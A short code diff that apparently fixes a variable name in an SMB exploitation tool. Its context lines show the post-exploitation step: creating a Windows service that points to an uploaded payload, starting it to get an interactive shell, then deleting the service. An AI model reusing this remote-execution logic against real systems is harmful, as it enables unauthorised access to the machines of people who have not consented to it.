@@ -1179,13 +1179,13 @@ def do_system_mysmb_session(conn, pipe_name, share, mode, payload_file):
         service_name + "\x00",
         service_name + "\x00",
         lpBinaryPathName=f"C:\\{payload_file}\x00",
-        dwStartType=scmr.SERVICE_DEMAND_START,
+        dwStartType=scmr_.SERVICE_DEMAND_START,
     )
     service = res["lpServiceHandle"]
     try:
         print("[*] Starting ineractive shell...")
         print("[!] Executing interactive programs will hang")
-        scmr.hRStartServiceW(scmr, service)
+        scmr_.hRStartServiceW(scmr, service)
     except Exception as e:
         print("[-] Failed to start service: %s" % str(e))
     scmr_.hRDeleteService(scmr, service)
